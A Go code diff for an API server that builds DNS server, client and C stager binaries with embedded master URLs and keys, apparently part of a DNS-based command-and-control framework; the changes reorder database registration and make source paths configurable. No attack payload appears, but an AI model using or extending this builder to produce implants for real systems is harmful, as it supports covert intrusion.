@@ -65,9 +65,22 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 	}
 
 	// Validate required fields
-	if req.Domain == "" || req.NS1 == "" || req.NS2 == "" {
-		api.sendError(w, http.StatusBadRequest, "domain, ns1, and ns2 are required")
+	if req.Domain == "" {
+		api.sendError(w, http.StatusBadRequest, "domain is required")
 		return
+	}
+
+	if req.ServerAddress == "" {
+		api.sendError(w, http.StatusBadRequest, "server address is required for A records")
+		return
+	}
+
+	// Auto-generate NS1 and NS2 from domain if not provided
+	if req.NS1 == "" {
+		req.NS1 = "ns1." + req.Domain
+	}
+	if req.NS2 == "" {
+		req.NS2 = "ns2." + req.Domain
 	}
 
 	// Generate encryption key if not provided
@@ -82,24 +95,26 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 	rand.Read(apiKeyBytes)
 	apiKey := hex.EncodeToString(apiKeyBytes)
 
-	// Register DNS server in database
+	// NOTE: Don't register in DB until build succeeds - see below
 	serverID := fmt.Sprintf("dns-%d", time.Now().Unix())
-	err := api.db.RegisterDNSServer(serverID, req.Domain, req.ServerAddress, apiKey)
-	if err != nil {
-		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to register DNS server: %v", err))
-		return
-	}
 
 	// Get master server URL from config
 	masterURL := fmt.Sprintf("https://%s:%d", api.config.BindAddr, api.config.BindPort)
 
 	// Build the server
-	binaryPath, err := buildDNSServer(req, masterURL, apiKey, serverID)
+	binaryPath, err := api.buildDNSServer(req, masterURL, apiKey, serverID)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
 		return
 	}
 	defer os.Remove(binaryPath)
+
+	// Register DNS server in database ONLY after successful build
+	err = api.db.RegisterDNSServer(serverID, req.Domain, req.ServerAddress, apiKey)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to register DNS server: %v", err))
+		return
+	}
 
 	// Save binary to builds directory
 	filename := fmt.Sprintf("dns-server-%s-%d", req.Domain, time.Now().Unix())
@@ -140,7 +155,7 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 	}
 
 	// Build the client
-	binaryPath, err := buildClient(req)
+	binaryPath, err := buildClient(req, api.config.SourceDir)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
 		return
@@ -189,7 +204,7 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 	}
 
 	// Build the stager
-	binaryPath, err := buildStager(req)
+	binaryPath, err := buildStager(req, api.config.SourceDir)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
 		return
@@ -224,7 +239,7 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 }
 
 // buildDNSServer compiles a DNS server with embedded configuration
-func buildDNSServer(req DNSServerBuildRequest, masterURL, apiKey, serverID string) (string, error) {
+func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKey, serverID string) (string, error) {
 	// Create temporary directory for build
 	buildDir, err := os.MkdirTemp("", "dns-server-build-*")
 	if err != nil {
@@ -233,7 +248,7 @@ func buildDNSServer(req DNSServerBuildRequest, masterURL, apiKey, serverID strin
 	defer os.RemoveAll(buildDir)
 
 	// Copy Server source files to build directory
-	serverSrcDir := filepath.Join("..", "Server")
+	serverSrcDir := filepath.Join(api.config.SourceDir, "Server")
 	if err := copyDir(serverSrcDir, buildDir); err != nil {
 		return "", fmt.Errorf("failed to copy source: %w", err)
 	}
@@ -279,7 +294,7 @@ func buildDNSServer(req DNSServerBuildRequest, masterURL, apiKey, serverID strin
 }
 
 // buildClient compiles a client with embedded configuration
-func buildClient(req ClientBuildRequest) (string, error) {
+func buildClient(req ClientBuildRequest, sourceRoot string) (string, error) {
 	// Create temporary directory for build
 	buildDir, err := os.MkdirTemp("", "client-build-*")
 	if err != nil {
@@ -288,7 +303,7 @@ func buildClient(req ClientBuildRequest) (string, error) {
 	defer os.RemoveAll(buildDir)
 
 	// Copy Client source files
-	clientSrcDir := filepath.Join("..", "Client")
+	clientSrcDir := filepath.Join(sourceRoot, "Client")
 	if err := copyDir(clientSrcDir, buildDir); err != nil {
 		return "", fmt.Errorf("failed to copy source: %w", err)
 	}
@@ -347,7 +362,7 @@ func buildClient(req ClientBuildRequest) (string, error) {
 }
 
 // buildStager compiles a stager with embedded configuration
-func buildStager(req StagerBuildRequest) (string, error) {
+func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 	// Stager is in C, needs different build process
 	// Create temporary directory
 	buildDir, err := os.MkdirTemp("", "stager-build-*")
@@ -357,7 +372,7 @@ func buildStager(req StagerBuildRequest) (string, error) {
 	defer os.RemoveAll(buildDir)
 
 	// Copy Stager source files
-	stagerSrcDir := filepath.Join("..", "Stager")
+	stagerSrcDir := filepath.Join(sourceRoot, "Stager")
 	if err := copyDir(stagerSrcDir, buildDir); err != nil {
 		return "", fmt.Errorf("failed to copy source: %w", err)
 	}
